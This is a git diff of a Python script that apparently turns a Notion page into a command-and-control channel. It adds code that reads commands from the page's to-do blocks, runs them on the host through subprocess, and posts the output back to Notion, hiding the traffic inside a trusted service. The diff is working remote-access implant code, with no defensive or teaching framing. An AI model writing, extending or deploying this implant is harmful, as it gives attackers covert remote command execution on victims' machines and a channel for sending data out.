@@ -5,16 +5,17 @@ import requests
 from getpass import getpass
 import socket
 from time import sleep
+import subprocess
 
 """
 Things we need to do:
 
 Load the API key*
-Start comms by making a new page
-Sleep 
-Get new blocks
-Any new commands?
-Do em
+Start comms by making a new page*
+Sleep* 
+Get new blocks*
+Any new commands?*
+Do em*
 """
 PARENT_PAGE_ID = "32b833db-af3f-4958-9960-339c2b658280"
 SLEEP_INTERVAL = 10
@@ -60,7 +61,40 @@ def new_command(blocks):
     return blocks[-1]["type"] == "to_do"
 
 def extract_command(block):
-    return block["to_do"]["text"][0]["text"]["content"]
+    try:
+        return block["to_do"]["text"][0]["text"]["content"]
+    except:
+        return None
+
+def complete_command(headers, block):
+    url = f"{URL_BASE}/blocks/{block['id']}"
+    r = requests.patch(url, headers=headers, json=block)
+    if r.status_code != 200:
+        print(r.content)
+
+
+def send_result(headers, page_id, output):
+    url = f"{URL_BASE}/blocks/{page_id}/children"
+    body = {
+        "children": [
+            {
+                "object": "block",
+                "type": "paragraph",
+                "paragraph": {
+                    "text": [
+                        {
+                            "type": "text", 
+                            "text": {"content": output},
+                            "annotations": {"code": True} 
+                        }
+                    ]
+                }
+            }
+        ]
+    }
+    r = requests.patch(url, headers=headers, json=body)
+    if r.status_code != 200:
+        print(r.content)
 
 def main():
     print("I'm sorry if this Notion is Offensive to you.")
@@ -82,15 +116,22 @@ def main():
     while True:
         blocks = get_blocks(headers, page_id)
         if blocks:
-            print(blocks[-1])
             if new_command(blocks):
-                command = extract_command(blocks[-1])
-                print(command)
+                command_block = blocks[-1]
+                command = extract_command(command_block)
+                if command:
+                    args = command.split(" ")
+                    if "🎯" in command:
+                        output = subprocess.run(args[:-1], capture_output=True)
+                        if output.stderr:
+                            send_result(headers, page_id, output.stderr)
+                        else:
+                            command_block["to_do"]["checked"] = True
+                            complete_command(headers, command_block)
+                            send_result(headers, page_id, output.stdout)
         else:
             print("ZZZZ")
         sleep(SLEEP_INTERVAL)
-
-
 
 if __name__ == "__main__":
     main()
